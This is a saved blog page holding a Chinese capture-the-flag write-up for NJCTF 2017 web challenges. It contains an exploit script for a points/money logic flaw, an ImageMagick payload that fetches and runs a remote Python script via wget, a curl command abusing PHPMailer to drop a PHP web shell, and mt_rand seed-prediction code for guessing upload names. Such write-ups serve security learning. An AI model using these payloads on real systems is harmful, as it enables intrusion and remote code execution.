@@ -1,0 +1,317 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>NJCTF-2017-web-writeup - l3m0n - 博客园</title>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./NJCTF-2017-web-writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./NJCTF-2017-web-writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./NJCTF-2017-web-writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./NJCTF-2017-web-writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./NJCTF-2017-web-writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./NJCTF-2017-web-writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html" id="cb_post_title_url">NJCTF-2017-web-writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>记录一下这次比赛web一些有意思的题</p>
+<h3 id="be-logical450">Be Logical(450)</h3>
+<p><a class="uri" href="http://218.2.197.235:23739/">http://218.2.197.235:23739/</a></p>
+<p>注册账号密码进去后发现大概是一个，积分可以转换为金币，然后再历史纪录里面又可以将金币转换为积分。<br/>
+第一个感觉肯定这个是逻辑漏洞，感觉积分和金币之间转换的时候，可以利用多线程来跑一下。</p>
+<p>在积分转换为金币的页面得知Sign.php，后面猜解文件泄漏为.Sign.php.swp，vim -r xx.swp就可以恢复代码。这个签名验证的代码是将<span class="math inline">\(_POST的转换后，再加一个`\)</span>code<code>进行md5，所以想尝试把这个</code>$code`跑出来，跑了几个小时，6位以下的小写+数字跑完发现还没破解出来...</p>
+<p>仔细理一下逻辑，发现其实应该不需要跑$code，因为后面有页面会把加密的sgin显示出来，所以完全可以先这样得到sgin然后去做其他的事情。所以尝试了一下多线程。</p>
+<p>利用的代码</p>
+<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> requests
+<span class="im">import</span> threading
+<span class="im">import</span> re
+
+cookie <span class="op">=</span> {
+  <span class="st">'PHPSESSID'</span>:<span class="st">'g3s0ngjo918f1ejm9tpqan63v2'</span>
+}
+
+s <span class="op">=</span> requests.session()
+
+data <span class="op">=</span> {
+  <span class="st">"comment"</span>:<span class="st">"1"</span>,
+  <span class="co">"money"</span>:<span class="st">"500a"</span>
+}
+
+<span class="kw">def</span> g():
+  <span class="co">#while 1:</span>
+    <span class="kw">global</span> data,cookie
+    mydata <span class="op">=</span> data.copy()
+    mydata[<span class="st">'point'</span>] <span class="op">=</span> <span class="st">'500a'</span>
+    mydata[<span class="st">'mypoint'</span>] <span class="op">=</span> <span class="st">'0'</span>
+    mydata[<span class="st">'mymoney'</span>] <span class="op">=</span> <span class="st">'0'</span>
+
+    <span class="bu">print</span> mydata
+
+    r2 <span class="op">=</span> s.post(<span class="st">"http://218.2.197.235:23739/process.php"</span>,data<span class="op">=</span>mydata,cookies<span class="op">=</span>cookie)
+    sign1 <span class="op">=</span> r2.content.split(<span class="st">'value="'</span>)[<span class="op">-</span><span class="dv">1</span>][:<span class="dv">32</span>]
+
+    mydata[<span class="st">'sign'</span>] <span class="op">=</span> sign1
+
+    r3 <span class="op">=</span> s.post(<span class="st">"http://218.2.197.235:23739/action.php"</span>,data<span class="op">=</span>mydata,cookies<span class="op">=</span>cookie)
+    <span class="bu">print</span> r3.content
+
+<span class="co">#------</span>
+
+<span class="kw">def</span> ree():
+  <span class="co">#while 1:</span>
+    <span class="kw">global</span> data,cookie
+    idd <span class="op">=</span> <span class="dv">0</span>
+    r <span class="op">=</span> s.get(<span class="st">"http://218.2.197.235:23739/history.php"</span>,cookies<span class="op">=</span>cookie)
+    m <span class="op">=</span> re.search(<span class="st">'&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;'</span>,r.content)
+    <span class="cf">if</span> m <span class="op">is</span> <span class="op">not</span> <span class="va">None</span>:
+      idd <span class="op">=</span> m.group(<span class="dv">1</span>)
+
+    data[<span class="st">'id'</span>] <span class="op">=</span> idd
+    data[<span class="st">'username'</span>] <span class="op">=</span> <span class="st">"nihao"</span>
+    data[<span class="st">'points'</span>] <span class="op">=</span> <span class="st">'500a'</span>
+
+    url <span class="op">=</span> <span class="st">"http://218.2.197.235:23739/refundprocess.php?comment=</span><span class="sc">%s</span><span class="st">&amp;id=</span><span class="sc">%s</span><span class="st">&amp;username=</span><span class="sc">%s</span><span class="st">&amp;points=</span><span class="sc">%s</span><span class="st">&amp;money=</span><span class="sc">%s</span><span class="st">"</span> <span class="op">%</span> (data[<span class="st">'comment'</span>],data[<span class="st">'id'</span>],data[<span class="st">'username'</span>],data[<span class="st">'points'</span>],data[<span class="st">'money'</span>])
+    r <span class="op">=</span> s.get(url,cookies<span class="op">=</span>cookie)
+    sign <span class="op">=</span> r.content.split(<span class="st">'value="'</span>)[<span class="op">-</span><span class="dv">1</span>][:<span class="dv">32</span>]
+    <span class="cf">if</span> <span class="st">'modified'</span> <span class="op">in</span> sign:
+      <span class="bu">print</span> <span class="st">'error'</span>,idd
+      <span class="cf">return</span> <span class="dv">0</span>
+
+    data[<span class="st">'sign'</span>] <span class="op">=</span> sign
+
+    r1 <span class="op">=</span> s.post(<span class="st">"http://218.2.197.235:23739/refund.php"</span>,data<span class="op">=</span>data,cookies<span class="op">=</span>cookie)
+    <span class="cf">if</span> <span class="st">'Success'</span> <span class="op">in</span> r1.content:
+      <span class="bu">print</span> <span class="st">'success'</span>,idd
+    <span class="cf">else</span>:
+      <span class="bu">print</span> r1.content
+
+g()
+ree()
+
+<span class="co"># re(2467)</span>
+
+<span class="co"># list = []</span>
+<span class="co"># for i in range(5):</span>
+<span class="co">#     t = threading.Thread(target=r)</span>
+<span class="co">#     t.setDaemon(True)</span>
+<span class="co">#     t.start()</span>
+<span class="co">#     list.append(t)</span>
+<span class="co"># for i in range(10):</span>
+<span class="co">#     t = threading.Thread(target=ree)</span>
+<span class="co">#     t.setDaemon(True)</span>
+<span class="co">#     t.start()</span>
+<span class="co">#     list.append(t)</span>
+<span class="co"># for i in list:</span>
+<span class="co">#     i.join()</span></code></pre></div>
+<p>跑了挺久感觉也不是很对，转换的时候应该是加了与数据库里面的数据进行判断，所以感觉缺少一个竞争条件。<br/>
+尝试修改了money等一些参数都为<code>500a</code>的时候发现还是能转，发现应该是对数字做了转化，然后尝试<code>500.0</code>等也不行，最后测试<code>500e1</code>的时候发现钱加到了5000.后面看源码是只是进行一些判断,并没有做什么处理,所以进入数据库能够使用e达到获取更多的积分.</p>
+<pre><code>if (floatval(floor($_POST['point'])) !== floatval($_POST['point'])) {
+  die("the point must be an INTEGER!");
+}</code></pre>
+<p>购买服务后，发现是图片上传的地方，可以进行图片转化，im的命令执行漏洞</p>
+<p>poc.png</p>
+<pre><code>push graphic-context
+viewbox 0 0 640 480
+image Over 0,0 0,0 '|wget xxx/down/tmp.py -P /tmp/ | python /tmp/tmp.py'
+pop graphic-context</code></pre>
+<p>getshell后find一下没发现flag，看进程的时候发现还有人用了ew工具...看一下arp缓存得到<code>172.17.0.19</code>，访问时候一个邮箱系统，这个前面zctf也出了这个，PHPMailer的漏洞</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="kw">curl</span> -sq <span class="st">'http://172.17.0.19'</span> -d <span class="st">'subject=&lt;?php system($_GET[1]);?&gt;&amp;email=a( -X/var/www/html/uploads/lemon1.php -OQueueDirectory=/tmp )@qq.com&amp;message=aaa&amp;submit=Send email'</span></code></pre></div>
+<p><img src="./NJCTF-2017-web-writeup - l3m0n - 博客园/804631-20170315131954245-495012250.png"/></p>
+<h3 id="geuess250">Geuess(250)</h3>
+<p>发现是一个包含，可以读取到源码</p>
+<div class="sourceCode"><pre class="sourceCode php"><code class="sourceCode php"><span class="kw">&lt;?php</span>
+<span class="kw">function</span> random_str<span class="ot">(</span><span class="kw">$length</span> = <span class="st">"32"</span><span class="ot">)</span> {
+    <span class="kw">$set</span> = <span class="fu">array</span><span class="ot">(</span><span class="st">"a"</span><span class="ot">,</span> <span class="st">"A"</span><span class="ot">,</span> <span class="st">"b"</span><span class="ot">,</span> <span class="st">"B"</span><span class="ot">,</span> <span class="st">"c"</span><span class="ot">,</span> <span class="st">"C"</span><span class="ot">,</span> <span class="st">"d"</span><span class="ot">,</span> <span class="st">"D"</span><span class="ot">,</span> <span class="st">"e"</span><span class="ot">,</span> <span class="st">"E"</span><span class="ot">,</span> <span class="st">"f"</span><span class="ot">,</span> <span class="st">"F"</span><span class="ot">,</span>
+        <span class="st">"g"</span><span class="ot">,</span> <span class="st">"G"</span><span class="ot">,</span> <span class="st">"h"</span><span class="ot">,</span> <span class="st">"H"</span><span class="ot">,</span> <span class="st">"i"</span><span class="ot">,</span> <span class="st">"I"</span><span class="ot">,</span> <span class="st">"j"</span><span class="ot">,</span> <span class="st">"J"</span><span class="ot">,</span> <span class="st">"k"</span><span class="ot">,</span> <span class="st">"K"</span><span class="ot">,</span> <span class="st">"l"</span><span class="ot">,</span> <span class="st">"L"</span><span class="ot">,</span>
+        <span class="st">"m"</span><span class="ot">,</span> <span class="st">"M"</span><span class="ot">,</span> <span class="st">"n"</span><span class="ot">,</span> <span class="st">"N"</span><span class="ot">,</span> <span class="st">"o"</span><span class="ot">,</span> <span class="st">"O"</span><span class="ot">,</span> <span class="st">"p"</span><span class="ot">,</span> <span class="st">"P"</span><span class="ot">,</span> <span class="st">"q"</span><span class="ot">,</span> <span class="st">"Q"</span><span class="ot">,</span> <span class="st">"r"</span><span class="ot">,</span> <span class="st">"R"</span><span class="ot">,</span>
+        <span class="st">"s"</span><span class="ot">,</span> <span class="st">"S"</span><span class="ot">,</span> <span class="st">"t"</span><span class="ot">,</span> <span class="st">"T"</span><span class="ot">,</span> <span class="st">"u"</span><span class="ot">,</span> <span class="st">"U"</span><span class="ot">,</span> <span class="st">"v"</span><span class="ot">,</span> <span class="st">"V"</span><span class="ot">,</span> <span class="st">"w"</span><span class="ot">,</span> <span class="st">"W"</span><span class="ot">,</span> <span class="st">"x"</span><span class="ot">,</span> <span class="st">"X"</span><span class="ot">,</span>
+        <span class="st">"y"</span><span class="ot">,</span> <span class="st">"Y"</span><span class="ot">,</span> <span class="st">"z"</span><span class="ot">,</span> <span class="st">"Z"</span><span class="ot">,</span> <span class="st">"1"</span><span class="ot">,</span> <span class="st">"2"</span><span class="ot">,</span> <span class="st">"3"</span><span class="ot">,</span> <span class="st">"4"</span><span class="ot">,</span> <span class="st">"5"</span><span class="ot">,</span> <span class="st">"6"</span><span class="ot">,</span> <span class="st">"7"</span><span class="ot">,</span> <span class="st">"8"</span><span class="ot">,</span> <span class="st">"9"</span><span class="ot">);</span>
+    <span class="kw">$str</span> = <span class="st">''</span><span class="ot">;</span>
+
+    <span class="kw">for</span> <span class="ot">(</span><span class="kw">$i</span> = <span class="dv">1</span><span class="ot">;</span> <span class="kw">$i</span> &lt;= <span class="kw">$length</span><span class="ot">;</span> ++<span class="kw">$i</span><span class="ot">)</span> {
+        <span class="kw">$ch</span> = <span class="fu">mt_rand</span><span class="ot">(</span><span class="dv">0</span><span class="ot">,</span> <span class="fu">count</span><span class="ot">(</span><span class="kw">$set</span><span class="ot">)</span> - <span class="dv">1</span><span class="ot">);</span>
+        <span class="kw">$str</span> .= <span class="kw">$set</span><span class="ot">[</span><span class="kw">$ch</span><span class="ot">];</span>
+    }
+
+    <span class="kw">return</span> <span class="kw">$str</span><span class="ot">;</span>
+}
+
+<span class="fu">session_start</span><span class="ot">();</span>
+
+<span class="kw">$reg</span> = <span class="st">'/gif|jpg|jpeg|png/'</span><span class="ot">;</span>
+<span class="kw">if</span> <span class="ot">(</span><span class="fu">isset</span><span class="ot">(</span><span class="kw">$_POST</span><span class="ot">[</span><span class="st">'submit'</span><span class="ot">]))</span> {
+
+    <span class="kw">$seed</span> = <span class="fu">rand</span><span class="ot">(</span><span class="dv">0</span><span class="ot">,</span> <span class="dv">999999999</span><span class="ot">);</span>
+    <span class="fu">mt_srand</span><span class="ot">(</span><span class="kw">$seed</span><span class="ot">);</span>
+    <span class="kw">$ss</span> = <span class="fu">mt_rand</span><span class="ot">();</span>
+    <span class="kw">$hash</span> = <span class="fu">md5</span><span class="ot">(</span><span class="fu">session_id</span><span class="ot">()</span> . <span class="kw">$ss</span><span class="ot">);</span>
+    <span class="fu">setcookie</span><span class="ot">(</span><span class="st">'SESSI0N'</span><span class="ot">,</span> <span class="kw">$hash</span><span class="ot">,</span> <span class="fu">time</span><span class="ot">()</span> + <span class="dv">3600</span><span class="ot">);</span>
+<span class="st">...</span>.
+    <span class="kw">if</span> <span class="ot">(</span><span class="kw">$check1</span><span class="ot">)</span> {
+        <span class="kw">$filename</span> = <span class="st">'./uP1O4Ds/'</span> . random_str<span class="ot">()</span> . <span class="st">'_'</span> . <span class="kw">$_FILES</span><span class="ot">[</span><span class="st">'file-upload-field'</span><span class="ot">][</span><span class="st">'name'</span><span class="ot">];</span>
+        <span class="kw">if</span> <span class="ot">(</span><span class="fu">move_uploaded_file</span><span class="ot">(</span><span class="kw">$_FILES</span><span class="ot">[</span><span class="st">'file-upload-field'</span><span class="ot">][</span><span class="st">'tmp_name'</span><span class="ot">],</span> <span class="kw">$filename</span><span class="ot">))</span>
+}</code></pre></div>
+<p>如果sessionid是没有的话，那么session_id()就是空字符串，这样的话，hash就是$ss的md5值，也就是纯数字，放cmd5解密就可以得到明文，也就是随机数，mt_rand生成的随机数是可以破解得到种子，所以可以再通过种子预测到后面的random_str的值，从而得到上传的文件名.</p>
+<p>预测种子的工具:<br/>
+<a class="uri" href="http://files.cnblogs.com/files/iamstudy/php_mt_seed-3.2.tar.gz">http://files.cnblogs.com/files/iamstudy/php_mt_seed-3.2.tar.gz</a></p>
+<p>exp:</p>
+<pre><code>&lt;?php
+mt_srand(369252519);
+echo mt_rand()."\n\r";
+function random_str($length = "32") {
+  $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+    "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+    "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+    "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+    "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+  $str = '';
+
+  for ($i = 1; $i &lt;= $length; ++$i) {
+    $ch = mt_rand(0, count($set) - 1);
+    $str .= $set[$ch];
+  }
+
+  return $str;
+}
+
+echo random_str()."\n\r";</code></pre>
+<p>这里要注意的是，因为在random_str之前还有一个mt_rand();，所以exp里面要写上一个,不然会预测出错.当时就是坑在这个地方.</p>
+<p>后面一个就是zip包含jpg，getshell.</p>
+<hr/>
+<p>最后还有一个be admin的题目,是cbc模式的安全问题，oracle padding和字节反转，经过md5 padding后，这个最近ctf出现过很多次。(*_*)，这个得再另起一篇文章来学习。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2017-03-15 13:21</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6553725" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6553725);return false;">收藏</a></div>
+</div>
+<script src="./NJCTF-2017-web-writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6553725,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2017/3/15 13:21:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./NJCTF-2017-web-writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="//img.users.51.la/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./NJCTF-2017-web-writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
